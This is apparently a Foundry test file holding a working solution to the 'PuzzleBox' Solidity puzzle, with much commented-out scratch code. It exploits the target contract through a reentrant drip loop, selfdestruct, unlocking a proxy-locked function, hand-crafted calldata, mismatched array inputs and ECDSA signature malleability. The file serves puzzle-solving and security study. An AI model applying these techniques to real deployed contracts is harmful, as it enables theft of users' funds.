pragma solidity ^0.8.19;

import "./PuzzleBox.sol";
import "forge-std/Test.sol";

contract PuzzleBoxSolution is Test {
    function solve(PuzzleBox puzzle) external {
        // How close can you get to opening the box?

        console.log('lastDripId', puzzle.lastDripId());
        console.log('puzzle eth', address(puzzle).balance);

        Operate operate = new Operate(puzzle, address(this));

        console.log('operate', address(operate));
        console.log('Operate eth', address(operate).balance);

        console.log('puzzle', address(puzzle));
        console.log('puzzle.operator()', puzzle.operator());
        console.log('puzzle eth', address(puzzle).balance);

        operate.callDrip();
        console.log('Operate eth', address(operate).balance);
        console.log('Puzzle eth', address(puzzle).balance);
        console.log('Solution eth', address(this).balance);
        console.log('puzzle.operator()', puzzle.operator());
        console.log('new lastDripId', puzzle.lastDripId());
        console.log('dripCount', puzzle.dripCount());
        // for(uint256 i = 0; i <= 10; i++) {
        //     console.log('isValidDripId %s', i, puzzle.isValidDripId(i));
        // }

        puzzle.leak();
        payable(address(uint160(address(puzzle)) + uint160(2))).transfer(1);
        puzzle.zip();
        console.log('isValidDripId %s', 1, puzzle.isValidDripId(1));

        puzzle.creep{gas: 98000}();
        console.log('isValidDripId %s', 10, puzzle.isValidDripId(10));


        // uint256[] memory dripIds = new uint256[];
        // bytes memory encodedDripIds = abi.encode([1, 2]);//, 4, 6, 7, 8, 9
        uint256[] memory inputArray = new uint256[](6);
        inputArray[0] = 2;
        inputArray[1] = 4;
        inputArray[2] = 6;
        inputArray[3] = 7;
        inputArray[4] = 8;
        inputArray[5] = 9;
        // inputArray[6] = 9;
        bytes memory encodedDripIds = abi.encode(inputArray);
        console.log('encodedDripIdsLength', encodedDripIds.length);
        // puzzle.torch(encodedDripIds);
        (bool success,) = address(puzzle).call(abi.encodePacked(
                            puzzle.torch.selector, uint256(0x01), uint8(0), encodedDripIds));
        // (bool success,) = address(puzzle).call(abi.encodeWithSignature("torch(bytes)", encodedDripIds));
        require(success, "call failed");

        address payable[] memory friends = new address payable[](1);
        uint256[] memory friendsCutBps = new uint256[](3);
        friends[0] = payable(0x416e59DaCfDb5D457304115bBFb9089531D873B7);
        friendsCutBps[0] = uint160(bytes20(0xC817dD2a5daA8f790677e399170c92AabD044b57));
        friendsCutBps[1] = 0.015e4;
        friendsCutBps[2] = 0.0075e4;

        puzzle.spread(friends, friendsCutBps);
        console.log('isValidDripId %s', 3, puzzle.isValidDripId(3));
        console.log('Puzzle eth', address(puzzle).balance);

        console.log('admin', puzzle.admin());

        uint256 SECP256k1N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141;
        uint256 nonce = 0xc8f549a7e4cb7e1c60d908cc05ceff53ad731e6ea0736edf7ffeea588dfb42d8;
        uint256 r = uint256(0xc8f549a7e4cb7e1c60d908cc05ceff53ad731e6ea0736edf7ffeea588dfb42d8);
        uint256 s = SECP256k1N - uint256(0x625cb970c2768fefafc3512a3ad9764560b330dcafe02714654fe48dd069b6df);

        // bytes32 threshold = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141;
        // uint256 nonce = 0xc8f549a7e4cb7e1c60d908cc05ceff53ad731e6ea0736edf7ffeea588dfb42d8;
        // bytes32 r = 0xc8f549a7e4cb7e1c60d908cc05ceff53ad731e6ea0736edf7ffeea588dfb42d8;
        // bytes32 s_ = 0x625cb970c2768fefafc3512a3ad9764560b330dcafe02714654fe48dd069b6df;
        // bytes32 s = threshold - s_;
        console.logBytes32(bytes32(s));
        uint8 v = 27;
        bytes memory sign = abi.encodePacked(r, s, v);
        puzzle.open(nonce, sign);
    }
}

interface IPBProxy {
    function lock(bytes4 selector, bool isLocked) external;
}

contract Operate {
    PuzzleBox puzzle;
    address solution;
    uint256 counter;
    constructor(PuzzleBox _puzzle, address _solution) payable {
        puzzle = _puzzle;
        solution = _solution;
        puzzle.operate();
        IPBProxy(address(puzzle)).lock(bytes4(keccak256("torch(bytes)")), false);
    }

    function callDrip() external {
        puzzle.drip{value: 101}();
    }

    receive() external payable {
        if(counter < 9) {
            ++counter;
            puzzle.drip{value: 101}();
        } else {
            selfdestruct(payable(solution));
        }
    }
}


        // uint256[] memory inputArray2 = new uint256[](3);
        // inputArray2[0] = 1;
        // inputArray2[1] = 9;
        // inputArray2[2] = 10;
        // encodedDripIds = abi.encode(inputArray2);
        // puzzle.torch(encodedDripIds);

// contract A {
//     receive() external payable {}
// }

// contract AFactory {
//     bytes32 constant salt = 0x7e99dadb0f9c9a21a0b0a07907baea686b2a2b0f1c8e0e480a390be5c2f5a5a5;

//     function deployA() public {
//         bytes memory bytecode = type(A).creationCode;
//         assembly {
//             let addr := create2(0, add(bytecode, 0x20), mload(bytecode), salt)
//             if iszero(extcodesize(addr)) {
//                 revert(0, 0)
//             }
//         }
//     }

//     function computeAddress() public view returns (address) {
//         bytes32 codehash = keccak256(type(A).creationCode);
//         return address(uint160(uint(keccak256(abi.encodePacked(bytes1(0xff), address(this), salt, codehash)))));
//     }
// }

        // console.log('gasleft1', gasleft());
        // puzzle.zip{gas: 1000000}();
        // console.log('isValidDripId %s', 1, puzzle.isValidDripId(1));
        // console.log('Puzzle eth', address(puzzle).balance);
        // address nextAddr = 0x037eDA3aDb1198021A9b2e88C22B464fd38db3f4;

        // AFactory factory = new AFactory();
        // console.log('factory', address(factory));

        // // deployA();
        // console.log('deployedA', factory.computeAddress());
        // console.logBytes(type(A).creationCode);
        // console.log('next addr eth', nextAddr.balance);
        // console.log('codeLength', nextAddr.code.length);


// // Step 3: Zip
        // puzzle.zip();

        // // Step 4: Creep
        // puzzle.creep();

        // // Step 5: Spread
        // address payable[] memory friends = new address payable[](2);
        // uint256[] memory friendsCutBps = new uint256[](friends.length);
        // friends[0] = payable(0x416e59DaCfDb5D457304115bBFb9089531D873B7);
        // friends[1] = payable(0xC817dD2a5daA8f790677e399170c92AabD044b57);
        // friendsCutBps[0] = 0.015e4;
        // friendsCutBps[1] = 0.0075e4;
        // puzzle.spread(friends, friendsCutBps);

        // // Step 6: Open the puzzle
        // bytes memory adminSig = abi.encodePacked(
        //     hex"c8f549a7e4cb7e1c60d908cc05ceff53ad731e6ea0736edf7ffeea588dfb42d8",
        //     hex"625cb970c2768fefafc3512a3ad9764560b330dcafe02714654fe48dd069b6df",
        //     hex"1c"
        // );
        // puzzle.open(0xc8f549a7e4cb7e1c60d908cc05ceff53ad731e6ea0736edf7ffeea588dfb42d8, adminSig);


        // for(uint256 i = 1; i <= 572; i++) {
        //     puzzle.leak();
        // }
        // puzzle.creep();
        // for(uint256 i = 1; i <= 6; i++) {
        //     puzzle.leak();
        // }


        ///////////////////////////////////////////////////////////////////////////
        // CleanPuzzleBoxSolution comments
        ///////////////////////////////////////////////////////////////////////////

                // console.log('puzzle address', address(puzzle));
        // vm.breakpoint("a");
        // Helper operate = new Helper(puzzle);
        // address(operate).call("");
        // bytes memory selectoors = abi.encodePacked(
        //     puzzle.operate.selector,
        //     puzzle.leak.selector,
        //     puzzle.zip.selector,
        //     puzzle.creep.selector,
        //     // torch calldata
        //     hex"925facb100000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000700000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000009",
        //     // spread calldata
        //     hex"2b071e47000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000001000000000000000000000000416e59dacfdb5d457304115bbfb9089531d873b70000000000000000000000000000000000000000000000000000000000000003000000000000000000000000c817dd2a5daa8f790677e399170c92aabd044b570000000000000000000000000000000000000000000000000000000000000096000000000000000000000000000000000000000000000000000000000000004b",
        //     // open calldata
        //     hex"58657dcfc8f549a7e4cb7e1c60d908cc05ceff53ad731e6ea0736edf7ffeea588dfb42d800000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000041c8f549a7e4cb7e1c60d908cc05ceff53ad731e6ea0736edf7ffeea588dfb42d89da3468f3d897010503caed5c52689b959fbac09ff6879275a8279feffcc8a621b00000000000000000000000000000000000000000000000000000000000000"
        // );
        
        // add puzzle.leakCount to access set (i.e. make it warm)
        // puzzle.leak(); ------------> assemblified above
        // address(uint160(address(puzzle)) + uint160(2)) = 0x037EDA3AdB1198021A9B2e88C22B464Fd38DB3f5
        // add puzzle + 2 to access set (i.e. make it warm) AND avoid the 25k value_to_empty_account_cost gas on calling zip()
        // unchecked {
        //     payable(address(uint160(address(puzzle)) + uint160(2))).transfer(1);  ------------> assemblified above
        // }
        // puzzle.zip(); ------------> assemblified above

        // puzzle.creep{gas: 98000}(); ------------> assemblified above

        // uint256[] memory n = new uint256[](6);
        // assembly {
        //     mstore(add(n, 0x20), 2)
        //     mstore(add(n, 0x40), 4)
        //     mstore(add(n, 0x60), 6)
        //     mstore(add(n, 0x80), 7)
        //     mstore(add(n, 0xa0), 8)
        //     mstore(add(n, 0xc0), 9)
        // }
        // bytes memory encodedDripIds = abi.encode(n);

        // // TODO: need to understand this calldata encoding scheme
        // address(puzzle).call(hex"925facb100000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000700000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000009");
        // console.logBytes(abi.encodePacked(
        //                     puzzle.torch.selector, uint256(0x01), uint8(0), encodedDripIds));

        // assembly {
        //     pop(call(gas(), 0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3, 0, add(selectoors, 0x30), 4, 0, 0))
        // }


        // address payable[] memory friends = new address payable[](1);
        // uint256[] memory friendsCutBps = new uint256[](3);
        // assembly {
        //     mstore(add(friends, 0x20), 0x416e59DaCfDb5D457304115bBFb9089531D873B7)
        //     mstore(add(friendsCutBps, 0x20), 0x00C817dD2a5daA8f790677e399170c92AabD044b57)
        //     mstore(add(friendsCutBps, 0x40), 150)
        //     mstore(add(friendsCutBps, 0x60), 75)
        // }

        // // puzzle.spread(friends, friendsCutBps);
        // bytes memory spreadData = abi.encodeWithSelector(puzzle.spread.selector, friends, friendsCutBps);
        // console.logBytes(spreadData);
        // address(puzzle).call(hex"2b071e47000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000001000000000000000000000000416e59dacfdb5d457304115bbfb9089531d873b70000000000000000000000000000000000000000000000000000000000000003000000000000000000000000c817dd2a5daa8f790677e399170c92aabd044b570000000000000000000000000000000000000000000000000000000000000096000000000000000000000000000000000000000000000000000000000000004b");

        // uint256 nonce = 0xc8f549a7e4cb7e1c60d908cc05ceff53ad731e6ea0736edf7ffeea588dfb42d8;
        // // uint256 r = uint256(0xc8f549a7e4cb7e1c60d908cc05ceff53ad731e6ea0736edf7ffeea588dfb42d8);
        // // S_THRESHOLD - uint256(0x625cb970c2768fefafc3512a3ad9764560b330dcafe02714654fe48dd069b6df)
        // // = 71301600283128936764672812745529451294904726341347593422192209434084996057698
        // uint256 s = 71301600283128936764672812745529451294904726341347593422192209434084996057698;
        // uint8 v = 27;
        // //= abi.encodePacked(nonce, s, v);
        // bytes memory sign = abi.encodePacked(nonce, s, v);
        // // assembly {
        // //     mstore(add(sign, 0x20), nonce)
        // //     mstore(add(sign, 0x40), s)
        // //     mstore(add(sign, 0x60), v)
        // // }
        // // puzzle.open(nonce, sign);
        // console.logBytes(abi.encodeWithSelector(puzzle.open.selector, nonce, sign));
        // address(puzzle).call(abi.encodeWithSelector(puzzle.open.selector, nonce, sign));

        // NOTE: this costs 6k less gas
        // puzzle.open(0xc8f549a7e4cb7e1c60d908cc05ceff53ad731e6ea0736edf7ffeea588dfb42d8,
        // (
        //     hex"c8f549a7e4cb7e1c60d908cc05ceff53ad731e6ea0736edf7ffeea588dfb42d8"
        //     hex"9da3468f3d897010503caed5c52689b959fbac09ff6879275a8279feffcc8a62"
        //     hex"1b"
        // ));

        // fallback() {
                // if(address(this).balance != 337) {
        //     address(puzzle).call{value:101}(hex"9f678cca");
        //     // puzzle.drip{value: 101}();
        //     // console.logBytes4(bytes4(keccak256("drip()"))); //0x9f678cca
        // } else {
        //     selfdestruct(payable(solution));
        // }

        // PuzzleBoxProxy(payable(0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3)).lock(puzzle.torch.selector, false);

        // console.logBytes4(bytes4(keccak256("operate()")));
        // console.logBytes(abi.encodeWithSignature("lock(bytes4,bool)", hex"41c0e1a1", false));